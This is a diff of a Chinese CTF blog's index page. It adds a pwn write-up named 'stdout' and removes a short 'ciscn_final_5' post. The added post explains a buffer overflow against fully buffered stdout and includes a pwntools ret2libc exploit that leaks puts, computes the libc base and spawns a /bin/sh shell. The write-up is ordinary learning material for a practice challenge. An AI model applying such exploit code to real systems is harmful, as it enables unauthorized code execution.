@@ -206,6 +206,104 @@
             
 
   
+    <article id="post-stdout" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/09/21/stdout/" target="_blank">stdout</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/09/21/stdout/" class="archive-article-date">
+        <time datetime="2024-09-21T14:44:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-09-21</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>这里stdout第三个参数是0，就是标准输出全缓冲，缓冲区被填满才能进行回显</p>
+<p>刷新缓冲区有几种办法</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190505843.png" alt="image-20240922190505843"></p>
+<p>能够溢出8字节</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190659808.png" alt="image-20240922190659808"></p>
+<p>一个没什么用的函数</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190726730.png" alt="image-20240922190726730"></p>
+<p>那么只能将缓冲区填满，刚开始想的是用vuln函数不断输入</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202629304.png" alt="image-20240922202629304"></p>
+<p>ret的操作是pop rip，rsp&#x3D;rsp+8, 指向0x0x7fff153a5588.  endbr64指令rsp是不动的，push rbp后rbp变成了原来返回地址的位置,再次调用相同的输入也只是让rbp+8,即每次</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">	payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>+p64(vul)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+
+<p>也只是让rbp+8移动</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202708003.png" alt="image-20240922202708003"></p>
+<p>第二次的rbp</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922203434985.png" alt="image-20240922203434985"></p>
+<p>只是调用vuln的话时不会回显的。</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922210006385.png" alt="image-20240922210006385"></p>
+<p>其实不是理想当然的填充，得调用extend函数填充缓冲区。那么就只能不断调用extend函数把缓冲区填满。</p>
+<p>调用extend时第二十次时的栈</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922205219910.png" alt="image-20240922205219910"></p>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,)</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">extend=<span class="number">0x401287</span></span><br><span class="line">vul=<span class="number">0x40125D</span></span><br><span class="line">pop_rdi=<span class="number">0x4013d3</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(vul)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(extend)+p64(vul)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">	payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>+p64(extend)+p64(vul)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stdout???&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base=puts_addr-<span class="number">0x10dfc0</span> <span class="comment">#libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;bin/sh&#x27;</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;put&#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/09/21/stdout/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-解决libc6软件包和libc6-dev不匹配的问题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -955,86 +1053,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2024/04/26/note2/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ciscn-final-5" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2024/04/11/ciscn-final-5/" target="_blank">ciscn_final_5</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2024/04/11/ciscn-final-5/" class="archive-article-date">
-        <time datetime="2024-04-11T11:36:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-11</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h5 id="没开偏移的保护"><a href="#没开偏移的保护" class="headerlink" title="没开偏移的保护"></a>没开偏移的保护</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193750286.png" alt="image-20240411193750286"></p>
-<p>地址进行或运算后保存，最后一位存index</p>
-<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193908492.png" alt="image-20240411193908492"></p>
-<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194425445.png" alt="image-20240411194425445"></p>
-<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194802328.png" alt="image-20240411194802328"></p>
-<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411195346375.png" alt="image-20240411195346375"></p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2024/04/11/ciscn-final-5/">展开全文 >></a>
     </p>
     
 
